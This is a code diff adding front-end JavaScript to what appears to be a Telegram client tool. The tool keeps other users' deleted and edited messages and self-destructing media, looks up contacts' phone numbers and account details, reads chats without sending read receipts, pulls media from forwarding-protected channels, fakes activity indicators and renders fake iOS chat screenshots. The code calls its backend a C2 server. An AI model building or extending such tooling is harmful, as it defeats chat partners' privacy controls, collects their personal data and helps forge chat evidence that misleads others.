@@ -2205,8 +2205,698 @@ document.addEventListener('keydown', e => {
 });
 
 /* ============ Startup ============ */
+
+
+/* ============ AyuVault Hub (Multi-Tenant Anti-Delete Intelligence) ============ */
+const vaultState = {
+  scope: 'dm',
+  filter: 'all',
+  selectedChatId: null,
+  selectedChatTitle: '',
+  selectedChatMeta: '',
+  data: null
+};
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
+async function loadVaultOverview() {
+  const forumTitle = document.getElementById('vaultForumTitle');
+  const forumSub = document.getElementById('vaultForumSub');
+  const btnOpen = document.getElementById('btnOpenTgForum');
+  const btnSync = document.getElementById('btnSyncTgForum');
+
+  try {
+    const res = await fetch(`${state.apiUrl}/api/vault/overview/${userId}`);
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const json = await res.json();
+    if (json.status !== 'ok') throw new Error(json.message || 'Ошибка');
+
+    vaultState.data = json;
+
+    if (json.forum && json.forum.created && json.forum.invite_link) {
+      if (forumTitle) forumTitle.textContent = json.forum.title || 'Телеграм-сейф (Супергруппа)';
+      if (forumSub) forumSub.textContent = `ID: ${json.forum.channel_id} • Ветки топиков активны`;
+      if (btnOpen) {
+        btnOpen.href = json.forum.invite_link;
+        btnOpen.style.display = 'inline-flex';
+      }
+      if (btnSync) btnSync.textContent = '🔄 Проверить Сейф';
+    } else {
+      if (forumTitle) forumTitle.textContent = 'Телеграм-сейф не настроен';
+      if (forumSub) forumSub.textContent = 'Нажмите кнопку для авто-создания приватной супергруппы с топиками в Telegram';
+      if (btnOpen) btnOpen.style.display = 'none';
+      if (btnSync) btnSync.textContent = '⚡️ Создать Сейф';
+    }
+
+    const st = json.stats || {};
+    const elTot = document.getElementById('vStatTotal');
+    const elPho = document.getElementById('vStatPhoto');
+    const elVoi = document.getElementById('vStatVoice');
+    const elVid = document.getElementById('vStatVideo');
+    const elTtl = document.getElementById('vStatTtl');
+
+    if (elTot) elTot.textContent = st.total || 0;
+    if (elPho) elPho.textContent = st.photo || 0;
+    if (elVoi) elVoi.textContent = st.voice || 0;
+    if (elVid) elVid.textContent = (st.video || 0) + (st.video_note || 0);
+    if (elTtl) elTtl.textContent = st.ttl || 0;
+
+    const ch = json.chats || {};
+    const bDm = document.getElementById('vBadgeDm');
+    const bGr = document.getElementById('vBadgeGroups');
+    const bCh = document.getElementById('vBadgeChannels');
+
+    if (bDm) bDm.textContent = (ch.dm || []).length;
+    if (bGr) bGr.textContent = (ch.groups || []).length;
+    if (bCh) bCh.textContent = (ch.channels || []).length;
+
+    renderVaultChats();
+  } catch (err) {
+    console.warn('[Vault] Ошибка загрузки обзора:', err);
+    const container = document.getElementById('vaultChatList');
+    if (container) {
+      container.innerHTML = '<div class="v-empty">Ожидание подключения к C2 серверу или базе данных...</div>';
+    }
+  }
+}
+
+function renderVaultChats() {
+  const container = document.getElementById('vaultChatList');
+  if (!container || !vaultState.data) return;
+
+  const scope = vaultState.scope;
+  const chats = (vaultState.data.chats && vaultState.data.chats[scope]) || [];
+
+  if (!chats.length) {
+    const scopeNames = { dm: 'личных диалогов', groups: 'групп', channels: 'каналов' };
+    container.innerHTML = `<div class="v-empty">Нет удаленных сообщений в категории ${scopeNames[scope] || ''}. Бот ведет мониторинг в фоне.</div>`;
+    return;
+  }
+
+  let html = '';
+  chats.forEach(c => {
+    const initial = (c.title || 'U').charAt(0).toUpperCase();
+    const sub = c.sender_username ? `@${c.sender_username}` : (c.chat_id > 0 ? `ID: ${c.chat_id}` : 'Группа');
+    html += `
+      <div class="v-chat-item" data-cid="${c.chat_id}" data-title="${encodeURIComponent(c.title)}" data-meta="${encodeURIComponent(sub)}">
+        <div class="v-chat-avatar">${initial}</div>
+        <div class="v-chat-info">
+          <div class="v-chat-top">
+            <span class="v-chat-name">${escapeHtml(c.title)}</span>
+            <span class="v-chat-time">${c.last_deleted ? c.last_deleted.split(' ')[0] : ''}</span>
+          </div>
+          <div class="v-chat-prev">${escapeHtml(c.preview || 'Удаленное сообщение')}</div>
+        </div>
+        <div class="v-chat-badge">🔥 ${c.deleted_count}</div>
+      </div>
+    `;
+  });
+
+  container.innerHTML = html;
+
+  container.querySelectorAll('.v-chat-item').forEach(item => {
+    item.addEventListener('click', () => {
+      haptic('light');
+      const cid = parseInt(item.dataset.cid);
+      const title = decodeURIComponent(item.dataset.title);
+      const meta = decodeURIComponent(item.dataset.meta);
+      openVaultChatDetail(cid, title, meta);
+    });
+  });
+}
+
+async function openVaultChatDetail(chatId, title, meta) {
+  vaultState.selectedChatId = chatId;
+  vaultState.selectedChatTitle = title;
+  vaultState.selectedChatMeta = meta;
+
+  const chatsView = document.getElementById('vaultChatsView');
+  const detailView = document.getElementById('vaultDetailView');
+  if (chatsView) chatsView.style.display = 'none';
+  if (detailView) detailView.style.display = 'block';
+
+  const tEl = document.getElementById('vdTitle');
+  const mEl = document.getElementById('vdMeta');
+  if (tEl) tEl.textContent = title;
+  if (mEl) mEl.textContent = meta;
+
+  vaultState.filter = 'all';
+  document.querySelectorAll('#vaultFilterChips .vchip').forEach(c => c.classList.toggle('on', c.dataset.filter === 'all'));
+
+  // Сброс активных кнопок фейкера
+  document.querySelectorAll('#vaultActionFakerBar .faker-chip').forEach(c => c.classList.remove('active'));
+
+  await loadChatDossier(chatId);
+  setupActionFaker(chatId);
+  await loadVaultMessages();
+}
+
+async function loadChatDossier(chatId) {
+  const chipsContainer = document.getElementById('dossierChips');
+  const statusEl = document.getElementById('dossierStatus');
+  if (!chipsContainer) return;
+
+  chipsContainer.innerHTML = '<span class="dossier-chip highlight">⚡ Сканирование MTProto...</span>';
+  if (statusEl) statusEl.textContent = '● SCANNING';
+
+  try {
+    const res = await fetch(`${state.apiUrl}/api/chat/dossier/${userId}/${chatId}`);
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const d = await res.json();
+
+    let html = '';
+    html += `<span class="dossier-chip highlight">🌐 ${escapeHtml(d.dc_id || 'DC ?')}</span>`;
+    html += `<span class="dossier-chip highlight">📅 Регистрация: ${escapeHtml(d.reg_year || 'Неизвестно')}</span>`;
+    html += `<span class="dossier-chip">👥 Общих чатов: <b>${d.common_chats || 0}</b></span>`;
+
+    if (d.is_premium) html += `<span class="dossier-chip premium">⭐ Telegram Premium</span>`;
+    if (d.is_verified) html += `<span class="dossier-chip highlight">✅ Verified</span>`;
+    if (d.is_scam) html += `<span class="dossier-chip scam">⚠️ SCAM FLAG</span>`;
+    if (d.is_fake) html += `<span class="dossier-chip scam">⚠️ FAKE FLAG</span>`;
+    if (d.is_bot) html += `<span class="dossier-chip">🤖 Бот</span>`;
+    if (d.username) html += `<span class="dossier-chip">@${escapeHtml(d.username)}</span>`;
+    if (d.phone) html += `<span class="dossier-chip">📞 +${escapeHtml(d.phone)}</span>`;
+
+    chipsContainer.innerHTML = html;
+    if (statusEl) statusEl.textContent = '● LIVE SYNCED';
+  } catch (err) {
+    console.warn('[Dossier] Ошибка загрузки досье:', err);
+    chipsContainer.innerHTML = `<span class="dossier-chip">ID: ${chatId}</span><span class="dossier-chip">Локальный кэш</span>`;
+    if (statusEl) statusEl.textContent = '○ OFFLINE';
+  }
+}
+
+function setupActionFaker(chatId) {
+  document.querySelectorAll('#vaultActionFakerBar .faker-chip').forEach(btn => {
+    btn.onclick = async () => {
+      haptic('medium');
+      const action = btn.dataset.action;
+      document.querySelectorAll('#vaultActionFakerBar .faker-chip').forEach(c => c.classList.remove('active'));
+
+      if (action !== 'cancel') {
+        btn.classList.add('active');
+      }
+
+      try {
+        const res = await fetch(`${state.apiUrl}/api/chat/action_faker`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: userId, chat_id: chatId, action })
+        });
+        const data = await res.json();
+        if (data.status === 'ok') {
+          toast(action === 'cancel' ? '⏹ Имитация остановлена' : `⚡ Имитация "${btn.textContent.trim()}" запущена!`);
+        } else {
+          toast('❌ ' + (data.message || 'Ошибка запуска фейкера'));
+        }
+      } catch (e) {
+        toast('❌ Ошибка сети при отправке действия');
+      }
+    };
+  });
+}
+
+window.ghostReadUntil = async function(chatId, maxId) {
+  haptic('medium');
+  try {
+    const res = await fetch(`${state.apiUrl}/api/chat/read_until`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: userId, chat_id: chatId, max_id: maxId })
+    });
+    const data = await res.json();
+    if (data.status === 'ok') {
+      toast(`👁 Чат прочитан строго до #${maxId} (остальные нетронуты)`);
+    } else {
+      toast('❌ ' + (data.message || 'Ошибка Ghost Read'));
+    }
+  } catch (e) {
+    toast('❌ Ошибка сети Ghost Read');
+  }
+};
+
+window.burnTtlMessage = async function(chatId, msgId) {
+  if (!confirm('Сжечь это сгорающее медиа у обоих собеседников прямо сейчас?')) return;
+  haptic('heavy');
+  try {
+    const res = await fetch(`${state.apiUrl}/api/chat/burn_ttl`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: userId, chat_id: chatId, msg_id: msgId })
+    });
+    const data = await res.json();
+    if (data.status === 'ok') {
+      toast(`🔥 Сообщение #${msgId} сожжено у собеседника!`);
+      await loadVaultMessages();
+    } else {
+      toast('❌ ' + (data.message || 'Ошибка поджога'));
+    }
+  } catch (e) {
+    toast('❌ Ошибка сети при удалении');
+  }
+};
+
+async function loadVaultMessages() {
+  const feed = document.getElementById('vaultMessagesFeed');
+  if (!feed || !vaultState.selectedChatId) return;
+
+  feed.innerHTML = '<div class="v-empty">Загрузка перехваченных сообщений...</div>';
+
+  try {
+    const res = await fetch(`${state.apiUrl}/api/vault/messages/${userId}/${vaultState.selectedChatId}?type=${vaultState.filter}`);
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const json = await res.json();
+    const items = json.items || [];
+    vaultState.currentMessages = items;
+
+    if (!items.length) {
+      feed.innerHTML = '<div class="v-empty">В выбранной категории сообщений не найдено.</div>';
+      return;
+    }
+
+    let html = '';
+    items.forEach(m => {
+      const isTtl = m.ttl && m.ttl > 0;
+      const isDeleted = m.is_deleted;
+      const isEdited = m.is_edited;
+
+      let cardClasses = ['v-msg-card'];
+      if (isTtl) cardClasses.push('is-ttl');
+      if (isDeleted) cardClasses.push('is-deleted');
+      if (isEdited) cardClasses.push('is-edited');
+
+      let badgeHtml = '';
+      if (isTtl) {
+        badgeHtml += `<div class="v-ttl-tag">⏳ СГОРАЮЩЕЕ МЕДИА (${m.ttl == 2147483647 || m.ttl == 1 ? '1 view' : m.ttl + 's'})</div>`;
+      }
+      if (isDeleted) {
+        badgeHtml += `<div class="v-del-badge">🗑 УДАЛЕНО: ${escapeHtml(m.deleted_at || '')}</div>`;
+      }
+      if (isEdited) {
+        badgeHtml += `<div class="v-edit-badge">✏️ ОТРЕДАКТИРОВАНО: ${escapeHtml(m.edited_at || '')}</div>`;
+      }
+
+      let contentHtml = '';
+      if (isEdited && m.original_text && m.original_text !== m.text) {
+        contentHtml = `
+          <div class="v-diff-box">
+            <span class="v-diff-old"><s>${escapeHtml(m.original_text)}</s></span>
+            <span class="v-diff-new">${escapeHtml(m.text || '')}</span>
+          </div>
+        `;
+      } else if (m.text) {
+        contentHtml = `<div class="v-msg-text">${escapeHtml(m.text)}</div>`;
+      }
+
+      let mediaHtml = '';
+      if (m.has_media) {
+        const mediaUrl = `${state.apiUrl}/api/vault/media/${m.session_id}/${m.msg_id}`;
+        if (m.media_type === 'photo') {
+          mediaHtml = `<div class="v-msg-media"><a href="${mediaUrl}" target="_blank"><img src="${mediaUrl}" loading="lazy" alt="Фото"></a></div>`;
+        } else if (m.media_type === 'video') {
+          mediaHtml = `<div class="v-msg-media"><video src="${mediaUrl}" controls preload="metadata"></video></div>`;
+        } else if (m.media_type === 'video_note') {
+          mediaHtml = `<div class="v-msg-media"><video class="circle-video" src="${mediaUrl}" controls autoplay muted loop playsinline></video></div>`;
+        } else if (m.media_type === 'voice' || m.media_type === 'audio') {
+          // Stealth Audio: локальный HTML5 плеер не шлет запросы прочтения в Telegram
+          mediaHtml = `<div class="v-msg-media"><audio src="${mediaUrl}" controls preload="metadata"></audio></div>`;
+        } else {
+          mediaHtml = `<div class="v-msg-media"><a class="btn btn-sm" href="${mediaUrl}" target="_blank">📥 Скачать файл (${m.media_type})</a></div>`;
+        }
+      }
+
+      let actionsHtml = `
+        <div class="v-msg-actions">
+          <button class="v-action-btn" onclick="ghostReadUntil(${m.chat_id}, ${m.msg_id})">👁 Прочитать до сюда</button>
+          ${isTtl && m.has_media ? `<a class="v-action-btn" href="${state.apiUrl}/api/vault/media/${m.session_id}/${m.msg_id}" download target="_blank">📥 В 4K/Оригинал</a>` : ''}
+          ${isTtl ? `<button class="v-action-btn burn" onclick="burnTtlMessage(${m.chat_id}, ${m.msg_id})">🔥 Сжечь у обоих</button>` : ''}
+        </div>
+      `;
+
+      html += `
+        <div class="${cardClasses.join(' ')}">
+          ${badgeHtml}
+          <div class="v-msg-head">
+            <span class="v-msg-sender">${escapeHtml(m.sender_name || 'Собеседник')} ${m.sender_username ? '(@' + escapeHtml(m.sender_username) + ')' : ''}</span>
+            <span class="v-msg-origtime">#${m.msg_id} · ${m.date || ''}</span>
+          </div>
+          ${contentHtml}
+          ${mediaHtml}
+          ${actionsHtml}
+        </div>
+      `;
+    });
+
+    feed.innerHTML = html;
+  } catch (err) {
+    console.warn('[Vault] Ошибка сообщений:', err);
+    feed.innerHTML = '<div class="v-empty">Ошибка загрузки сообщений.</div>';
+  }
+}
+
+// Vault Event Listeners Setup
+function setupVaultListeners() {
+  document.querySelectorAll('#vaultScopeTabs .chip').forEach(ch => {
+    ch.addEventListener('click', () => {
+      haptic('light');
+      document.querySelectorAll('#vaultScopeTabs .chip').forEach(c => c.classList.remove('on'));
+      ch.classList.add('on');
+      vaultState.scope = ch.dataset.scope;
+      renderVaultChats();
+    });
+  });
+
+  const btnBack = document.getElementById('btnBackToChats');
+  if (btnBack) {
+    btnBack.addEventListener('click', () => {
+      haptic('light');
+      const chatsView = document.getElementById('vaultChatsView');
+      const detailView = document.getElementById('vaultDetailView');
+      if (detailView) detailView.style.display = 'none';
+      if (chatsView) chatsView.style.display = 'block';
+    });
+  }
+
+  document.querySelectorAll('#vaultFilterChips .vchip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      haptic('light');
+      document.querySelectorAll('#vaultFilterChips .vchip').forEach(c => c.classList.remove('on'));
+      chip.classList.add('on');
+      vaultState.filter = chip.dataset.filter;
+      loadVaultMessages();
+    });
+  });
+
+  const btnSync = document.getElementById('btnSyncTgForum');
+  if (btnSync) {
+    btnSync.addEventListener('click', async () => {
+      haptic('medium');
+      btnSync.disabled = true;
+      btnSync.textContent = '⏳ Создаем сейф в Telegram...';
+      try {
+        const res = await fetch(`${state.apiUrl}/api/vault/create_forum`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: userId })
+        });
+        const data = await res.json();
+        if (data.status === 'ok') {
+          hapticNotify('success');
+          toast('🎉 ' + data.message);
+          await loadVaultOverview();
+        } else {
+          hapticNotify('error');
+          toast('❌ ' + (data.message || 'Ошибка создания'));
+          btnSync.textContent = '⚡️ Повторить создание';
+          btnSync.disabled = false;
+        }
+      } catch (e) {
+        hapticNotify('error');
+        toast('❌ Ошибка сети при вызове Vault API');
+        btnSync.textContent = '⚡️ Повторить создание';
+        btnSync.disabled = false;
+      }
+    });
+  }
+}
+
+
+/* ============ Media Snatcher (Zero-Click Ripper) ============ */
+async function loadSnatcherChannels() {
+  const select = document.getElementById('snatcherChannelSelect');
+  const btn = document.getElementById('btnRefreshSnatcherChannels');
+  if (!select) return;
+
+  const userId = getTargetUserId();
+  btn.disabled = true;
+  btn.textContent = '⏳ Загрузка...';
+  select.innerHTML = '<option value="">Синхронизация диалогов с MTProto...</option>';
+
+  try {
+    const res = await fetch(`${state.apiUrl}/api/snatcher/channels/${userId}`);
+    const data = await res.json();
+    if (data.status === 'ok' && data.channels && data.channels.length > 0) {
+      select.innerHTML = '';
+      data.channels.forEach(c => {
+        const opt = document.createElement('option');
+        opt.value = c.id;
+        const lock = c.noforwards ? '🔒 [Защищен] ' : '';
+        const uname = c.username ? ` (@${c.username})` : '';
+        opt.textContent = `${lock}${c.title}${uname} · ID: ${c.id}`;
+        select.appendChild(opt);
+      });
+      hapticNotify('success');
+      toast(`✅ Загружено ${data.channels.length} каналов`);
+    } else {
+      select.innerHTML = '<option value="">Каналы не найдены (проверьте подключение сессии)</option>';
+      toast('ℹ️ Нет доступных каналов');
+    }
+  } catch (err) {
+    select.innerHTML = '<option value="">Ошибка загрузки каналов</option>';
+    toast('❌ Ошибка связи с API');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '🔄 Загрузить каналы';
+  }
+}
+
+async function startSnatchProcess() {
+  const select = document.getElementById('snatcherChannelSelect');
+  const countSelect = document.getElementById('snatcherCountSelect');
+  const btn = document.getElementById('btnStartSnatch');
+  const box = document.getElementById('snatcherStatusBox');
+  const txt = document.getElementById('snatcherStatusText');
+  const bar = document.getElementById('snatcherProgressBar');
+
+  if (!select || !select.value) {
+    toast('⚠️ Сначала выберите канал из списка');
+    return;
+  }
+
+  const channelId = select.value;
+  const count = parseInt(countSelect.value || '10', 10);
+  const userId = getTargetUserId();
+
+  btn.disabled = true;
+  box.style.display = 'block';
+  txt.innerHTML = '⚡ <b>Подключение к каналу и выгрузка медиа в байтах...</b>';
+  bar.style.width = '35%';
+  haptic('heavy');
+
+  try {
+    const res = await fetch(`${state.apiUrl}/api/snatcher/download`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        user_id: userId,
+        channel_id: channelId,
+        count: count
+      })
+    });
+    const data = await res.json();
+
+    if (data.status === 'ok') {
+      bar.style.width = '100%';
+      txt.innerHTML = `✅ <b>Успешно!</b> Выгружено <b>${data.fetched}</b> постов (из них медиа: <b>${data.media_count}</b>). Проверьте Избранное!`;
+      hapticNotify('success');
+      toast('🎉 Контент доставлен в Избранное!');
+    } else {
+      bar.style.width = '0%';
+      txt.innerHTML = `❌ <b>Ошибка:</b> ${data.message || 'Сбой выгрузки'}`;
+      hapticNotify('error');
+    }
+  } catch (err) {
+    bar.style.width = '0%';
+    txt.innerHTML = '❌ <b>Сетевая ошибка при запросе к серверу</b>';
+    hapticNotify('error');
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+function setupSnatcherListeners() {
+  const btnRefresh = document.getElementById('btnRefreshSnatcherChannels');
+  if (btnRefresh) {
+    btnRefresh.addEventListener('click', () => {
+      haptic('light');
+      loadSnatcherChannels();
+    });
+  }
+  const btnStart = document.getElementById('btnStartSnatch');
+  if (btnStart) {
+    btnStart.addEventListener('click', () => {
+      startSnatchProcess();
+    });
+  }
+}
+
+/* ============ Fakeshot Pro & WebSocket Sync ============ */
+function setupFakeshotListeners() {
+  const btnOpen = document.getElementById('btnOpenFakeshotModal');
+  const btnClose = document.getElementById('btnCloseFakeshot');
+  const modal = document.getElementById('fakeshotModal');
+  const btnGen = document.getElementById('btnGenerateFakeshot');
+
+  if (btnOpen && modal) {
+    btnOpen.addEventListener('click', () => {
+      haptic('light');
+      const titleInput = document.getElementById('fakeTitleInput');
+      const timeInput = document.getElementById('fakeTimeInput');
+      if (titleInput && vaultState.selectedChatTitle) {
+        titleInput.value = vaultState.selectedChatTitle;
+      }
+      if (timeInput) {
+        const now = new Date();
+        const hh = String(now.getHours()).padStart(2, '0');
+        const mm = String(now.getMinutes()).padStart(2, '0');
+        timeInput.value = `${hh}:${mm}`;
+      }
+      modal.style.display = 'flex';
+    });
+  }
+
+  if (btnClose && modal) {
+    btnClose.addEventListener('click', () => {
+      modal.style.display = 'none';
+    });
+  }
+
+  if (modal) {
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) modal.style.display = 'none';
+    });
+  }
+
+  if (btnGen) {
+    btnGen.addEventListener('click', async () => {
+      haptic('heavy');
+      btnGen.disabled = true;
+      btnGen.textContent = '⏳ Рендеринг iOS 18 (1170x2532)...';
+
+      try {
+        const titleVal = document.getElementById('fakeTitleInput')?.value?.trim() || 'Избранное';
+        const timeVal = document.getElementById('fakeTimeInput')?.value?.trim() || '13:02';
+        const batVal = parseInt(document.getElementById('fakeBatteryInput')?.value) || 44;
+        const sendSaved = Boolean(document.getElementById('fakeSendToSaved')?.checked);
+
+        // Преобразуем последние сообщения из активного чата для рендера
+        let mapped = [];
+        if (vaultState.currentMessages && vaultState.currentMessages.length > 0) {
+          mapped = vaultState.currentMessages.slice(0, 10).reverse().map(m => ({
+            sender: m.sender_name || 'Собеседник',
+            text: m.text || (m.has_media ? `[Медиафайл: ${m.media_type}]` : ''),
+            is_out: Boolean(m.is_out),
+            time: m.date ? m.date.substring(11, 16) : timeVal,
+            is_deleted: Boolean(m.is_deleted),
+            sender_id: String(m.sender_id || '')
+          }));
+        }
+
+        const res = await fetch(`${state.apiUrl}/api/chat/fakeshot`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            user_id: userId,
+            chat_id: vaultState.selectedChatId || 0,
+            title: titleVal,
+            subtitle: 'в сети',
+            time_header: timeVal,
+            battery_pct: batVal,
+            send_to_saved: sendSaved,
+            messages: mapped
+          })
+        });
+
+        const data = await res.json();
+        if (data.status === 'ok') {
+          hapticNotify('success');
+          const previewWrap = document.getElementById('fakeshotPreviewWrap');
+          const previewImg = document.getElementById('fakeshotImg');
+          const dlWrap = document.getElementById('fakeshotDownloadWrap');
+          const dlBtn = document.getElementById('btnDownloadFakeshot');
+
+          if (previewImg && previewWrap) {
+            previewImg.src = data.image_data;
+            previewWrap.style.display = 'block';
+          }
+          if (dlBtn && dlWrap) {
+            dlBtn.href = data.image_data;
+            dlBtn.download = data.file_name || 'fakeshot_ios18.png';
+            dlWrap.style.display = 'block';
+          }
+
+          toast(sendSaved ? '📸 Скриншот готов и отправлен в Избранное!' : '✅ Скриншот iOS 18 готов!');
+        } else {
+          hapticNotify('error');
+          toast('❌ ' + (data.message || 'Ошибка генерации скриншота'));
+        }
+      } catch (err) {
+        hapticNotify('error');
+        toast('❌ Ошибка сети при рендере скриншота');
+      } finally {
+        btnGen.disabled = false;
+        btnGen.textContent = '🚀 Сгенерировать скриншот iOS 18';
+      }
+    });
+  }
+}
+
+function connectWebSocket() {
+  if (!state.apiUrl) return;
+  try {
+    const wsProto = state.apiUrl.startsWith('https') ? 'wss:' : 'ws:';
+    const host = state.apiUrl.replace(/^https?:\/\//, '');
+    const wsUrl = `${wsProto}//${host}/ws/${userId}`;
+    const ws = new WebSocket(wsUrl);
+
+    ws.onopen = () => {
+      console.log('[WS] Подключено к C2 WebSocket Hub');
+    };
+
+    ws.onmessage = (event) => {
+      try {
+        const msg = JSON.parse(event.data);
+        if (msg.type === 'message_deleted') {
+          haptic('heavy');
+          toast(`🗑 Перехвачено удаление сообщения в чате ${msg.chat_id}!`);
+          if (vaultState.selectedChatId === msg.chat_id) {
+            loadVaultMessages();
+          }
+        } else if (msg.type === 'message_edited') {
+          haptic('medium');
+          toast(`✏️ Перехвачена правка сообщения в чате ${msg.chat_id}!`);
+          if (vaultState.selectedChatId === msg.chat_id) {
+            loadVaultMessages();
+          }
+        }
+      } catch (e) {
+        // Ping-pong or other raw strings
+      }
+    };
+
+    ws.onclose = () => {
+      setTimeout(connectWebSocket, 4000);
+    };
+  } catch (e) {
+    console.warn('[WS] Ошибка инициализации сокета:', e);
+  }
+}
+
 (async function init() {
   await discoverApiUrl();
   setProfile(initialProfile, true);
   await loadRealWorkers();
+  setupVaultListeners();
+  setupSnatcherListeners();
+  setupFakeshotListeners();
+  connectWebSocket();
+  await loadVaultOverview();
 })();
